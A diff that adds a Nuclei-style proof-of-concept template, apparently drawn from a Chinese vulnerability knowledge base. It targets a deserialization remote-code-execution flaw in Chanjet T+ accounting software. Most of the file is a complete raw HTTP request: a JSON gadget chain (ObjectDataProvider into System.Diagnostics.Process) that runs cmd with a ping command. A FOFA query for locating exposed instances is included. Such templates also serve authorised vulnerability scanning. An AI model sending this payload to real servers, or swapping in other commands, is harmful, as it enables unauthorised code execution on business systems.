@@ -1,0 +1,19 @@
+id: poc-tn26fgngmb48gafm
+info:
+  name: 畅捷通T+ RRATableController,Ufida.T.DI.UIP.ashx 反序列化RCE漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tn26fgngmb48gafm'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tn26fgngmb48gafm
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - "POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1\n\nContent-Type: application/json\n\n\n\n{\n\n  \"storeID\":{\n\n    \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n\n    \"MethodName\":\"Start\",\n\n    \"ObjectInstance\":{\n\n        \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n\n        \"StartInfo\": {\n\n            \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n\n            \"FileName\":\"cmd\", \"Arguments\":\"/c ping www.baidu.com\"\n\n       }\n\n    }\n\n  }\n\n}\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
